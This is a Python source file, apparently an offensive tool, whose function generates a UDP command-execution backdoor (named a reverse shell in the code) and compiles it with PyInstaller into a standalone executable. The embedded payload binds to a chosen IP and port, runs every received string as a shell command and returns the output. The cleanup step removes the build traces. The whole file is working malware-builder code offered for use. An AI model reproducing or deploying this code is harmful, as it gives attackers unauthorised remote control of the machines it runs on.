import subprocess
import sys
import os
import shutil

#TODO:make executable that works for linux too

def make_executable(output_directory, ipaddress, port, script_name, exe_name):

    reverse_shell_content = f'''
import socket
import subprocess

socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('{ipaddress}',{port})
socket.bind(server_address)

while True:
    data, address = socket.recvfrom(4096)
    data_str = data.decode('utf-8')
    
    print(f"[!] Recieved [{{data_str}}] from {{address[0]}} | {{address[1]}}")  
    try:
        output = subprocess.check_output(data_str, shell=True)
    except:
        output = b" [!] Invalid Command"
    socket.sendto(output, address)

    
    '''

    with open(script_name, "w") as file:
        file.write(reverse_shell_content)

    try:
        if not os.path.exists(output_directory):
            os.makedirs(output_directory)

        subprocess.check_call([
            sys.executable, '-m', 'PyInstaller',
            '--onefile',  # single executable
            '--noconfirm',  # Overwrite existing files
            '--distpath', output_directory,  # output directory
            script_name  # Name
        ])
        
        # Cleanup
        build_dir = "build"
        spec_file = f"{exe_name}.spec"
        script_file = f"{script_name}"
        if os.path.exists(build_dir):
            shutil.rmtree(build_dir)
        if os.path.exists(spec_file):
            os.remove(spec_file)
        if os.path.exists(script_file):
            os.remove(script_file)
        

        print(f"Executable created successfully in {output_directory}.")
        
    except subprocess.CalledProcessError as e:
        print(f"Failed to create executable: {e}")